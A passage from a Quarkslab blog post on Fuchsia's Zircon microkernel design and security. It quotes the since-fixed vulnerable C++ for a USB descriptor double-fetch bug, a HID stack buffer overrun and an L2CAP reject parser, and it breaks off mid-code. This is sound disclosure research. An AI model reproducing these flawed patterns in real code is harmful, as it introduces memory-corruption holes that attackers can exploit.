{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"Playing Around With The Fuchsia Operating System","link":"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html","description":"<div class=\"section\" id=\"introduction\"> \n <h2>Introduction</h2> \n <p><a class=\"reference external\" href=\"https://fuchsia.dev/\">Fuchsia</a> is a new operating system developed by Google, targeting the AArch64 and x86_64 architectures. While little is known about the purpose of this OS and where it will be used, it seems plausible that it aims at replacing Android on smartphones and Chrome OS on laptops.</p> \n <p>In the interest of acquiring knowledge on an OS that could possibly run on millions of devices in the future, we decided to give a quick look at Fuchsia, learn about its inner design, security properties, strengths and weaknesses, and find ways to attack it.</p> \n</div> \n<div class=\"section\" id=\"outline\"> \n <h2>Outline</h2> \n <ul class=\"simple\"> \n  <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#monolithic-kernels-vs-micro-kernels\">Monolithic kernels vs. micro kernels</a></li> \n  <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#the-zircon-micro-kernel\">The Zircon micro kernel</a> \n   <ul> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#components\">Components</a></li> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#process-isolation\">Process isolation</a></li> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#namespaces\">Namespaces</a></li> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#handles\">Handles</a></li> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#syscalls\">Syscalls</a></li> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#mitigations-and-security-practices\">Mitigations and security practices</a></li> \n   </ul> </li> \n  <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#where-we-at\">Where we at?</a></li> \n  <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#attacking-fuchsia\">Attacking Fuchsia</a> \n   <ul> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#usb-stack\">USB stack</a></li> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#bluetooth-stack\">Bluetooth stack</a></li> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#hypervisor-vmcall-bug\">Hypervisor vmcall bug</a></li> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#kernel-mishandling-of-mxcsr\">Kernel mishandling of MXCSR</a></li> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#kernel-mishandling-of-iretq\">Kernel mishandling of iretq</a></li> \n    <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#others\">Others</a></li> \n   </ul> </li> \n  <li><a class=\"reference internal\" href=\"http://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html#conclusion\">Conclusion</a></li> \n </ul> \n</div> \n<div class=\"section\" id=\"monolithic-kernels-vs-micro-kernels\"> \n <h2>Monolithic kernels vs. micro kernels</h2> \n <p>The most common form of kernel design today is <strong>monolithic kernels</strong>. For example, the Linux and BSD kernels are all monolithic, and being based on Linux, the Android and Chrome OS kernels are monolithic as well.</p> \n <p>A monolithic kernel is typically very big, embeds all device drivers and network stacks, has hundreds of syscalls, and simply said provides all system functionalities.</p> \n <p>The inner design of monolithic kernels varies from kernel to kernel, but overall the following internals tend to be common:</p> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/monolithic.png\" /> \n <p>One clear security problem of monolithic kernels is that any vulnerability in an internal system component will affect all of the kernel. Suppose, in the schema above, that the USB driver has an exploitable memory corruption: since the driver runs within the kernel space, an attacker that exploits this vulnerability gains control of all of the kernel.</p> \n <p>Fuchsia is not based on a monolithic kernel, but rather on a <strong>micro kernel</strong>.</p> \n <p>A micro kernel is a type of kernel designed to be very small, as its name indicates, implementing only a limited number of core features, such as scheduling, exception handling, memory management, a few device drivers (if needed) and a few syscalls. The rest of the components are moved to userland, and are not part of the kernel.</p> \n <p>Example of micro kernel design:</p> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/micro.png\" /> \n <p>Here the VFS layer, socket layer, networks stacks, file systems and device drivers are moved to userland in dedicated user processes, which communicate between one another via IPCs.</p> \n <p>For example, an FTP client may fetch data from the network and store it in a USB key only by communicating with other userland processes, without any intervention by the kernel. The kernel only ensures privilege separation and isolation of the processes.</p> \n <p>This micro kernel design has interesting security properties. Suppose once again that there is a vulnerability in the USB driver; in this case, an attacker will be able to take control of the USB driver process running in userland (<strong>Sys Process 6</strong>), but will then be bound to this very process with no opportunity to immediately run with wider privileges, whether they be kernel privileges, or privileges of other processes (the FTP client for instance).</p> \n <p>The attacker must therefore exploit additional vulnerabilities to move laterally, which is a strong security improvement compared to monolithic kernels.</p> \n</div> \n<div class=\"section\" id=\"the-zircon-micro-kernel\"> \n <h2>The Zircon micro kernel</h2> \n <p>Fuchsia's micro kernel is called Zircon. It is written in <tt class=\"docutils literal\">C++</tt>. We describe here some relevant internals of this kernel.</p> \n <div class=\"section\" id=\"components\"> \n  <h3>Components</h3> \n  <p>The system is organised in <strong>components</strong> which run in userland. The network stack, for example, is a component that runs in userland. The USB drivers, too, are components that run in userland.</p> \n  <p>The components interact with one another via IPCs, the interfaces of which we won't discuss here.</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/components.png\" /> \n  <p>There is no strict programming language requirements for components: they can be written in <tt class=\"docutils literal\">C++</tt>, <tt class=\"docutils literal\">Rust</tt>, <tt class=\"docutils literal\">Go</tt>, or other, and interact via IPCs without problems. For example, the USB drivers are written in <tt class=\"docutils literal\">C++</tt>, and the network stack is instead coded in <tt class=\"docutils literal\">Rust</tt>.</p> \n  <p>When it comes to device drivers, they get folded together in processes called <strong>devhosts</strong>. A devhost is a process that contains several layers of a driver stack. For example:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/devhosts.png\" /> \n  <p>There are three devhosts here. The <strong>Devhost Process 3</strong> for example contains the AHCI driver, the SATA driver, and the <em>MinFS</em> and <em>BlobFS</em> file systems. All of these components live within the same process.</p> \n  <p>This kind of weakens the segmentation model because now several components are actually part of the same process, so a vulnerability in one component will affect the other components of the process too. However, it appears that devhosts are organized in a way that only a single device stack can be in a process, typically implying that it's not possible to have the USB driver and the SATA driver in the same devhost. Therefore, the benefits of the segmentation model hold.</p> \n </div> \n <div class=\"section\" id=\"process-isolation\"> \n  <h3>Process isolation</h3> \n  <p>Zircon protects its memory and that of the processes by using the CPU's <em>MMU</em> (<a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Memory_management_unit\">Memory Management Unit</a>), in a manner that is typical of modern OSes: each process has an address space, and this address space is context-switched by Zircon.</p> \n  <p>Contrary to other OSes however, the <em>IOMMU</em> (<a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Input%E2%80%93output_memory_management_unit\">Input-Output MMU</a>), plays an important role on Zircon: it is programmed by the kernel so that each devhost process can perform DMA operations only on its own address space and not outside.</p> \n  <p>The IOMMU is therefore as important as the MMU to ensure process isolation, because without it, a devhost process could simply perform DMA operations against the kernel pages and overwrite their contents.</p> \n  <p>Additionally, on x86, the <em>TSS I/O Bitmap</em> (<a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Task_state_segment\">Task State Segment</a>) is used to limit access to I/O ports, in a way that is not relevant to discuss here.</p> \n </div> \n <div class=\"section\" id=\"namespaces\"> \n  <h3>Namespaces</h3> \n  <p>In Fuchsia, there is no \"unified\" filesystem visible by user processes. Each process has its own virtual filesystem, called a <strong>namespace</strong>. The namespace contains <strong>objects</strong>, which can be files, services, devices. These objects are ordered in a hierarchy, and accessible using file paths with the usual POSIX functions such as <tt class=\"docutils literal\">open()</tt>.</p> \n  <p>Several paths are of interest. One is the directory <tt class=\"docutils literal\">/svc/</tt>, which contains service objects, for instance <tt class=\"docutils literal\">/svc/fuchsia.hardware.usb.device</tt>; these are typically objects on which IPCs can be performed. That is to say, one component can expose IPCs via a service object in <tt class=\"docutils literal\">/svc/</tt>, and other components can access these IPCs by accessing this service object in their respective namespaces.</p> \n  <p>The namespace is created along with the process when it spawns. It is possible to use a <strong>manifest</strong> file to dictate which paths/objects will be present within the namespace hierarchy, thereby providing a sandboxing mechanism that limits which IPCs a process will be able to access.</p> \n  <p>It is to be noted that the notion of namespace lives within the user processes, but not in the kernel. It can be seen as a convenient, easy-to-use interface for developers to handle objects; but the reality is that the kernel has no understanding of the namespace, of its hierarchy, and of its objects. The only thing the kernel is aware of, is <strong>handles</strong>.</p> \n </div> \n <div class=\"section\" id=\"handles\"> \n  <h3>Handles</h3> \n  <p>Zircon manages accesses to components via <strong>handles</strong>, which can be seen as <em>file descriptors</em> on Unix, or general access tokens.</p> \n  <p>Without going into boring details, the objects in the namespace are basically backed by handles, and a <em>path</em> in the namespace actually corresponds to a handle. Again, the kernel doesn't know anything about the namespaces and their objects, it only knows about handles. Namespaces live in userland and can be seen as big user-friendly wrappers around handles.</p> \n  <p>Handles have a <strong>kind</strong> and a <strong>right</strong>. The Zircon syscalls, for the vast majority, depend on handles to manage access rights. To access certain classes of syscalls, a handle must be of the right <em>kind</em>, and to do specific operations with a syscall, the handle must also have the right <em>right</em>.</p> \n  <p>It is to be noted that the kernel has no understanding of the notion of <strong>user</strong>, contrary to Unix systems.</p> \n  <p>Everything comes down to the notion of handle, and that's what we are mainly interested in from a security point of view: attackers will typically try to obtain better handles than the ones they have.</p> \n </div> \n <div class=\"section\" id=\"syscalls\"> \n  <h3>Syscalls</h3> \n  <p>Although not always up-to-date, the <a class=\"reference external\" href=\"https://fuchsia.dev/fuchsia-src/reference/syscalls\">official documentation</a> is rather clear, and nothing particular needs to be highlighted. It shows which handles are required to perform which classes of syscalls.</p> \n </div> \n <div class=\"section\" id=\"mitigations-and-security-practices\"> \n  <h3>Mitigations and security practices</h3> \n  <p>In terms of mitigations, Fuchsia uses <a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Address_space_layout_randomization\">ASLR</a> (mandatory for userland), <a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/W%5EX\">DEP</a>, <a class=\"reference external\" href=\"https://clang.llvm.org/docs/SafeStack.html\">SafeStack</a>, <a class=\"reference external\" href=\"https://clang.llvm.org/docs/ShadowCallStack.html\">ShadowCallStack</a>, <a class=\"reference external\" href=\"https://reviews.llvm.org/D54604\">AutoVarInit</a>. The Zircon kernel is compiled with all of that by default.</p> \n  <p>When it comes to security practices, it can be noted in the Fuchsia code that a lot of (all?) components have associated unit tests and fuzzers. The fuzzing is done via <a class=\"reference external\" href=\"https://llvm.org/docs/LibFuzzer.html\">libfuzzer</a> to fuzz internal structures within components, and via <a class=\"reference external\" href=\"https://github.com/google/syzkaller\">syzkaller</a> to fuzz the user-exposed syscalls. There is also support for the <a class=\"reference external\" href=\"https://clang.llvm.org/docs/AddressSanitizer.html\">ASan</a> and <a class=\"reference external\" href=\"https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html\">UBSan</a> sanitizers, however no <a class=\"reference external\" href=\"https://clang.llvm.org/docs/MemorySanitizer.html\">MSan</a> or <a class=\"reference external\" href=\"https://clang.llvm.org/docs/ThreadSanitizer.html\">TSan</a> support seems to be present.</p> \n  <p>Finally when it comes to programming languages, as said earlier, the components can be written in <tt class=\"docutils literal\">C++</tt>, <tt class=\"docutils literal\">Go</tt>, <tt class=\"docutils literal\">Rust</tt>. Arguably the language most prone to programming errors used here is <tt class=\"docutils literal\">C++</tt>. For <tt class=\"docutils literal\">C++</tt> code, the components usually override several operators to perform sanity checks; for example, the <tt class=\"docutils literal\">[]</tt> operator (used when accessing arrays) is often overloaded to make sure that the index is in the range of the array and doesn't overflow or underflow. Therefore, even on \"error-prone\" languages, some security measures are proactively put in place.</p> \n </div> \n</div> \n<div class=\"section\" id=\"where-we-at\"> \n <h2>Where we at?</h2> \n <p>Let's sum up the design aspects so far from the security point of view:</p> \n <ul class=\"simple\"> \n  <li>Fuchsia uses a micro kernel whose attack surface is limited by nature: few entry points, less complex logic.</li> \n  <li>The system is organized in components which run in userland. This brings good segmentation properties: a vulnerability that affects a component compromises only its process.</li> \n  <li>The components can actually be written in safe languages such as <tt class=\"docutils literal\">Rust</tt>, in which several classes of vulnerabilities simply do not exist.</li> \n  <li>The components have their own virtual filesystem that can be sandboxed and that lives entirely on the user side. The kernel knows nothing about it.</li> \n  <li>Access to components and syscalls is based on handles, which act as the only tokens the kernel knows about. They are abstracted as objects in the namespace.</li> \n  <li>The mitigations provided by default in the kernel are rather good as of this writing.</li> \n  <li>The components and kernel are fuzzed and unit-tested in a seemingly systematic manner.</li> \n </ul> \n <p>So what can we say about security in Fuchsia? Overall, its kernel design is inherently safer than Linux's, and the mitigations and security practices around it are better than those currently adopted in Linux.</p> \n <p>Two negative points can be noted:</p> \n <ul class=\"simple\"> \n  <li>Fuchsia doesn't (yet?) support the <a class=\"reference external\" href=\"https://clang.llvm.org/docs/ControlFlowIntegrity.html\">CFI</a> and <a class=\"reference external\" href=\"https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf\">PAC</a> mitigations. The latter is known to be strong.</li> \n  <li>The fact that devhosts combine several components within one process weakens the segmentation model a bit when it comes to device drivers.</li> \n </ul> \n</div> \n<div class=\"section\" id=\"attacking-fuchsia\"> \n <h2>Attacking Fuchsia</h2> \n <p>Contrary to every other major OS, it appears rather difficult to target the Zircon kernel directly. A successful RCE (<em>Remote Code Execution</em>) on the world-facing parts of the system (USB, Bluetooth, network stack, etc) will only give you control over the targeted components, but they run in independent userland processes, not in the kernel. From a component, you then need to escalate privileges to the kernel using the limited number of syscalls you can access with the handles you have. Overall, it seems easier to target other components rather than the kernel, and to focus on components that you can talk to via IPC and that you know have interesting handles.</p> \n <p>For fun, we decided to do some vulnerability research in some parts of the system, to see how far we could go in limited time, and see whether the overall good security properties of Fuchsia really lived up to their promises.</p> \n <p>The issues listed below were all reported to Google, and have now been fixed.</p> \n <div class=\"section\" id=\"usb-stack\"> \n  <h3>USB stack</h3> \n  <div class=\"section\" id=\"out-of-bounds-access\"> \n   <h4>Out-of-bounds access</h4> \n   <p>When attaching a USB device to the machine, Fuchsia will fetch <em>descriptor tables</em> from the device as part of the USB enumeration process. This is done by a component in the USB devhost. The component actually has a bug when handling <em>configuration descriptor tables</em>:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"c1\">// read configuration descriptor header to determine size</span>\n<span class=\"n\">usb_configuration_descriptor_t</span> <span class=\"n\">config_desc_header</span><span class=\"p\">;</span>\n<span class=\"kt\">size_t</span> <span class=\"n\">actual</span><span class=\"p\">;</span>\n<span class=\"n\">status</span> <span class=\"o\">=</span> <span class=\"n\">GetDescriptor</span><span class=\"p\">(</span><span class=\"n\">USB_DT_CONFIG</span><span class=\"p\">,</span> <span class=\"n\">config</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">config_desc_header</span><span class=\"p\">,</span>\n                       <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"n\">config_desc_header</span><span class=\"p\">),</span> <span class=\"o\">&amp;</span><span class=\"n\">actual</span><span class=\"p\">);</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">status</span> <span class=\"o\">==</span> <span class=\"n\">ZX_OK</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">actual</span> <span class=\"o\">!=</span> <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"n\">config_desc_header</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n  <span class=\"n\">status</span> <span class=\"o\">=</span> <span class=\"n\">ZX_ERR_IO</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">status</span> <span class=\"o\">!=</span> <span class=\"n\">ZX_OK</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"n\">zxlogf</span><span class=\"p\">(</span><span class=\"n\">ERROR</span><span class=\"p\">,</span> <span class=\"s\">\"%s: GetDescriptor(USB_DT_CONFIG) failed</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span> <span class=\"n\">__func__</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"n\">status</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"kt\">uint16_t</span> <span class=\"n\">config_desc_size</span> <span class=\"o\">=</span> <span class=\"n\">letoh16</span><span class=\"p\">(</span><span class=\"n\">config_desc_header</span><span class=\"p\">.</span><span class=\"n\">wTotalLength</span><span class=\"p\">);</span>\n<span class=\"k\">auto</span><span class=\"o\">*</span> <span class=\"n\">config_desc</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"n\">ac</span><span class=\"p\">)</span> <span class=\"kt\">uint8_t</span><span class=\"p\">[</span><span class=\"n\">config_desc_size</span><span class=\"p\">];</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">ac</span><span class=\"p\">.</span><span class=\"n\">check</span><span class=\"p\">())</span> <span class=\"p\">{</span>\n  <span class=\"k\">return</span> <span class=\"n\">ZX_ERR_NO_MEMORY</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"n\">config_descs_</span><span class=\"p\">[</span><span class=\"n\">config</span><span class=\"p\">].</span><span class=\"n\">reset</span><span class=\"p\">(</span><span class=\"n\">config_desc</span><span class=\"p\">,</span> <span class=\"n\">config_desc_size</span><span class=\"p\">);</span>\n\n<span class=\"c1\">// read full configuration descriptor</span>\n<span class=\"n\">status</span> <span class=\"o\">=</span> <span class=\"n\">GetDescriptor</span><span class=\"p\">(</span><span class=\"n\">USB_DT_CONFIG</span><span class=\"p\">,</span> <span class=\"n\">config</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">config_desc</span><span class=\"p\">,</span> <span class=\"n\">config_desc_size</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">actual</span><span class=\"p\">);</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">status</span> <span class=\"o\">==</span> <span class=\"n\">ZX_OK</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">actual</span> <span class=\"o\">!=</span> <span class=\"n\">config_desc_size</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"n\">status</span> <span class=\"o\">=</span> <span class=\"n\">ZX_ERR_IO</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">status</span> <span class=\"o\">!=</span> <span class=\"n\">ZX_OK</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"n\">zxlogf</span><span class=\"p\">(</span><span class=\"n\">ERROR</span><span class=\"p\">,</span> <span class=\"s\">\"%s: GetDescriptor(USB_DT_CONFIG) failed</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span> <span class=\"n\">__func__</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"n\">status</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>Let's see what's going on here. First, the component fetches the <tt class=\"docutils literal\">config_desc_header</tt> structure, which has a fixed size; then, it reads the <tt class=\"docutils literal\">wTotalLength</tt> field of the structure, allocates a buffer of this size, and then re-fetches the table this time retrieving the full amount of data.</p> \n   <p>Later in the USB stack, the <tt class=\"docutils literal\">wTotalLength</tt> value is trusted as being the total size of the structure, which kind of makes sense here.</p> \n   <p>The problem is, between the first fetch and the second fetch the USB device could have modified the <tt class=\"docutils literal\">wTotalLength</tt> value. In fact, after the second fetch, <tt class=\"docutils literal\">wTotalLength</tt> could be bigger than the initial value; in that case the rest of the USB stack will still trust it, and will perform out-of-bounds accesses.</p> \n   <p>As a reminder, the USB stack runs in userland and not in the kernel, so it's not a kernel bug.</p> \n   <p>Fix: <a class=\"reference external\" href=\"https://fuchsia.googlesource.com/fuchsia/+/fd872ce1d485f9a2ee2793aa2e113f84352d5794\">[usb-device] Verify wTotalLength sanity</a>.</p> \n  </div> \n  <div class=\"section\" id=\"stack-overflow\"> \n   <h4>Stack overflow</h4> \n   <p>While navigating through the USB code, we noticed a function that had an apparent stack overflow:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"n\">zx_status_t</span> <span class=\"n\">HidDevice</span><span class=\"o\">::</span><span class=\"n\">HidDeviceGetReport</span><span class=\"p\">(</span><span class=\"n\">hid_report_type_t</span> <span class=\"n\">rpt_type</span><span class=\"p\">,</span> <span class=\"kt\">uint8_t</span> <span class=\"n\">rpt_id</span><span class=\"p\">,</span>\n                                          <span class=\"kt\">uint8_t</span><span class=\"o\">*</span> <span class=\"n\">out_report_data</span><span class=\"p\">,</span> <span class=\"kt\">size_t</span> <span class=\"n\">report_count</span><span class=\"p\">,</span>\n                                          <span class=\"kt\">size_t</span><span class=\"o\">*</span> <span class=\"n\">out_report_actual</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"n\">input_report_size_t</span> <span class=\"n\">needed</span> <span class=\"o\">=</span> <span class=\"n\">GetReportSizeById</span><span class=\"p\">(</span><span class=\"n\">rpt_id</span><span class=\"p\">,</span> <span class=\"k\">static_cast</span><span class=\"o\">&lt;</span><span class=\"n\">ReportType</span><span class=\"o\">&gt;</span><span class=\"p\">(</span><span class=\"n\">rpt_type</span><span class=\"p\">));</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">needed</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">ZX_ERR_NOT_FOUND</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">needed</span> <span class=\"o\">&gt;</span> <span class=\"n\">report_count</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">ZX_ERR_BUFFER_TOO_SMALL</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"kt\">uint8_t</span> <span class=\"n\">report</span><span class=\"p\">[</span><span class=\"n\">HID_MAX_REPORT_LEN</span><span class=\"p\">];</span>\n  <span class=\"kt\">size_t</span> <span class=\"n\">actual</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">zx_status_t</span> <span class=\"n\">status</span> <span class=\"o\">=</span> <span class=\"n\">hidbus_</span><span class=\"p\">.</span><span class=\"n\">GetReport</span><span class=\"p\">(</span><span class=\"n\">rpt_type</span><span class=\"p\">,</span> <span class=\"n\">rpt_id</span><span class=\"p\">,</span> <span class=\"n\">report</span><span class=\"p\">,</span> <span class=\"n\">needed</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">actual</span><span class=\"p\">);</span>\n  <span class=\"cm\">/* ... */</span>\n<span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>In short, the <tt class=\"docutils literal\">GetReportSizeById()</tt> function returns a 16-bit value previously obtained from the USB device. <tt class=\"docutils literal\">HID_MAX_REPORT_LEN</tt> has the value <tt class=\"docutils literal\">8192</tt>. Here, the call to <tt class=\"docutils literal\">GetReport()</tt> can overflow the <tt class=\"docutils literal\">report</tt> array with USB-controllable data.</p> \n   <p>It appears that there is no relevant user of this function that could make it USB-triggerable, so it's a bit of an uninteresting bug. Note also that with the <a class=\"reference external\" href=\"https://clang.llvm.org/docs/SafeStack.html\">SafeStack</a> mitigation, the <tt class=\"docutils literal\">report</tt> array is actually in the <em>unsafe stack</em>, which means that overflowing it will not allow the attacker to overwrite the return instruction pointer.</p> \n   <p>Fix: <a class=\"reference external\" href=\"https://fuchsia.googlesource.com/fuchsia/+/ba8bd54cda59bb55e62a390b7fd0bcafcc72c034\">[hid] Fix GetReport buffer overrun</a>.</p> \n  </div> \n </div> \n <div class=\"section\" id=\"bluetooth-stack\"> \n  <h3>Bluetooth stack</h3> \n  <div class=\"section\" id=\"l2cap-reject-packets\"> \n   <h4>L2CAP: <tt class=\"docutils literal\">reject</tt> packets</h4> \n   <p>To handle <tt class=\"docutils literal\">reject</tt> packets, the <a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols#Logical_link_control_and_adaptation_protocol_(L2CAP)\">L2CAP</a> protocol uses this piece of code:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"n\">ResponseT</span> <span class=\"nf\">rsp</span><span class=\"p\">(</span><span class=\"n\">status</span><span class=\"p\">);</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">status</span> <span class=\"o\">==</span> <span class=\"n\">Status</span><span class=\"o\">::</span><span class=\"n\">kReject</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">rsp</span><span class=\"p\">.</span><span class=\"n\">ParseReject</span><span class=\"p\">(</span><span class=\"n\">rsp_payload</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"n\">bt_log</span><span class=\"p\">(</span><span class=\"n\">TRACE</span><span class=\"p\">,</span> <span class=\"s\">\"l2cap\"</span><span class=\"p\">,</span> <span class=\"s\">\"cmd: ignoring malformed Command Reject, size %zu\"</span><span class=\"p\">,</span>\n           <span class=\"n\">rsp_payload</span><span class=\"p\">.</span><span class=\"n\">size</span><span class=\"p\">());</span>\n    <span class=\"k\">return</span> <span class=\"n\">ResponseHandlerAction</span><span class=\"o\">::</span><span class=\"n\">kCompleteOutboundTransaction</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span> <span class=\"n\">InvokeResponseCallback</span><span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"n\">rsp_cb</span><span class=\"p\">,</span> <span class=\"n\">std</span><span class=\"o\">::</span><span class=\"n\">move</span><span class=\"p\">(</span><span class=\"n\">rsp</span><span class=\"p\">));</span>\n<span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>The <tt class=\"docutils literal\">ParseReject()</tt> method gets called with <tt class=\"docutils literal\">rsp_payload</tt>, which contains the received packet, of an arbitrary size. The method is implemented as follows:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"kt\">bool</span> <span class=\"n\">CommandHandler</span><span class=\"o\">::</span><span class=\"n\">Response</span><span class=\"o\">::</span><span class=\"n\">ParseReject</span><span class=\"p\">(</span><span class=\"k\">const</span> <span class=\"n\">ByteBuffer</span><span class=\"o\">&amp;</span> <span class=\"n\">rej_payload_buf</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">auto</span><span class=\"o\">&amp;</span> <span class=\"n\">rej_payload</span> <span class=\"o\">=</span> <span class=\"n\">rej_payload_buf</span><span class=\"p\">.</span><span class=\"n\">As</span><span class=\"o\">&lt;</span><span class=\"n\">CommandRejectPayload</span><span class=\"o\">&gt;</span><span class=\"p\">();</span>\n  <span class=\"n\">reject_reason_</span> <span class=\"o\">=</span> <span class=\"k\">static_cast</span><span class=\"o\">&lt;</span><span class=\"n\">RejectReason</span><span class=\"o\">&gt;</span><span class=\"p\">(</span><span class=\"n\">letoh16</span><span class=\"p\">(</span><span class=\"n\">rej_payload</span><span class=\"p\">.</span><span class=\"n\">reason</span><span class=\"p\">));</span>\n  <span class=\"cm\">/* ... */</span>\n<span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>Here the payload is suddenly treated as a <tt class=\"docutils literal\">CommandRejectPayload</tt> structure, with no apparent length check. This could be an out-of-bounds access, but in fact the <tt class=\"docutils literal\">.As&lt;&gt;</tt> directive automatically performs the length check:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"c1\">// Converts the underlying buffer to the given type with bounds checking. The buffer is allowed</span>\n<span class=\"c1\">// to be larger than T. The user is responsible for checking that the first sizeof(T) bytes</span>\n<span class=\"c1\">// represents a valid instance of T.</span>\n<span class=\"k\">template</span> <span class=\"o\">&lt;</span><span class=\"k\">typename</span> <span class=\"n\">T</span><span class=\"o\">&gt;</span>\n<span class=\"k\">const</span> <span class=\"n\">T</span><span class=\"o\">&amp;</span> <span class=\"n\">As</span><span class=\"p\">()</span> <span class=\"k\">const</span> <span class=\"p\">{</span>\n  <span class=\"c1\">// std::is_trivial_v would be a stronger guarantee that the buffer contains a valid T object,</span>\n  <span class=\"c1\">// but would disallow casting to types that have useful constructors, which might instead cause</span>\n  <span class=\"c1\">// uninitialized field(s) bugs for data encoding/decoding 